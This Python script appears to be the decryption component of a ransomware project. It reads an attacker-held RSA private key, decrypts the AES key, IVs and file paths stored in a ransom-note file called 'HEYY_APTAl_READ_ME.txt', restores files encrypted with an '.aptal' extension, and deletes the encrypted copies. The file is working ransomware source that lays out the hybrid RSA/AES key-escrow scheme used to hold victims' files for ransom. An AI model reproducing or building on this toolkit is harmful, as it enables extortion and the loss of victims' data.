import os
import sys
import base64

import utils
from hasp.AESCipher import AESCipher
from hasp.RSACipher import RSACipher


def openthelock(enc_aesIV_file_path,dec_aesIV_file_path):
    """
        IVs, AES key and file paths are encrypted by RSA public key after file encrypted by AES.
        This function decrypt the encrypted information.

        HEYY_APTAl_READ_ME.txt schema
            info about us
            base64(RSA(aes key))
            base64(RSA(iv_1)):::::base64(RSA(file_1))
            .
            .
            .
            base64(RSA(iv_n)):::::base64(RSA(file_n))

    """
    print("Begin to DECRYPT the keys ::",enc_aesIV_file_path)

    rsa_private_key = open(utils.rsa_private_key_path,"rb").read()
    rsa_cipher = RSACipher(rsa_private_key)
    
    with open(enc_aesIV_file_path,"rb") as ivs_file:
        
        for i in range(utils.pass_the_introduction):
            _temp = ivs_file.readline()

        with open(dec_aesIV_file_path,"wb") as dec_ivs_file:

            # decrypt aes key
            aes_key = ivs_file.readline().strip()
            aes_key = base64.b64decode(aes_key)
            aes_key = rsa_cipher.decrypt(aes_key)
            dec_ivs_file.write(aes_key+b"\n")
            
            # Decrypt iv and path with given RSA private key than write the decrypted pairs to dec_aesIV_file_path
            for line in ivs_file.readlines():
                iv, which_file = line.strip().split(b":::::")       
                iv = rsa_cipher.decrypt(base64.b64decode(iv.decode()))
                which_file = rsa_cipher.decrypt(base64.b64decode(which_file.decode("utf-8")))
                dec_ivs_file.write(iv+b":::::"+which_file+b"\n")

def decryptFile(aes_cipher,iv,file_path):
    """
        Decryption of files which are encrypted with AES is done here

        aes_cipher: our AES decryptor object
        iv: the initial vector(iv) which is used to encrypt the file
        file_path: which file will decrypt
    """
    encrypted_file_path = file_path+b".aptal"
    chunk_size = 16*1024
    with open(encrypted_file_path, 'rb') as infile:
        with open(file_path, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                outfile.write(aes_cipher.decrypt(iv, chunk))
    # deleting .aptal file
    os.remove(encrypted_file_path) 

def startRescueFiles(dec_aesIV_file_path):
    """
        Reading IVs and file paths from decrypted_iv_file.txt which is a form of decrypted HEYY_APTAl_READ_ME.txt file
    """
    print("Begin to DECRYPT the Files ::",dec_aesIV_file_path)

    with open(dec_aesIV_file_path,"rb") as ivs_file:

        # read aes key
        aes_key = ivs_file.readline().strip()
        aes_cipher = AESCipher(aes_key)

        # read the file line by line then decrypt them one by one
        for line in ivs_file.readlines():
            iv, which_file = line.strip().split(b":::::")
            decryptFile(aes_cipher,iv,which_file)


def main():

    # if this file have been created, we're going to create a new one not to ruin old keys
    _count_of_file = 0
    for name in os.listdir(utils.desktop_directory):
        if name[-len(utils.aesIV_file_store_name):] == utils.aesIV_file_store_name:
            _count_of_file += 1

    for i in range(_count_of_file):
        aesIV_file_store_path = os.path.join(utils.desktop_directory,str(i)+utils.aesIV_file_store_name)
        dec_aesIV_file_store_path = os.path.join(utils.desktop_directory,str(i)+utils.dec_aesIV_file_store_name)

        print(aesIV_file_store_path,":::",dec_aesIV_file_store_path)
    
        openthelock(aesIV_file_store_path,dec_aesIV_file_store_path)
        startRescueFiles(dec_aesIV_file_store_path)


if __name__ == "__main__":
    main()